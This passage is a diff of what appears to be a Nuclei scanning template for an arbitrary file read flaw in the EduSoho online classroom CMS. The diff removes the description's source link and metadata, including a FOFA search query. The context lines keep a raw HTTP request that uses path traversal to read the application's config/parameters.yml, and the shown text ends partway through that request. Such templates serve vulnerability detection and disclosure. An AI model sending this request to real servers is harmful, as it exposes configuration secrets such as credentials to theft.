@@ -3,12 +3,8 @@ info:
   name: Edusoho网络课堂cms存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xguz56kugq8tp7nc'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xguz56kugq8tp7nc
-    fofa: title="EduSoho"
 http:
 - raw:
   - 'GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
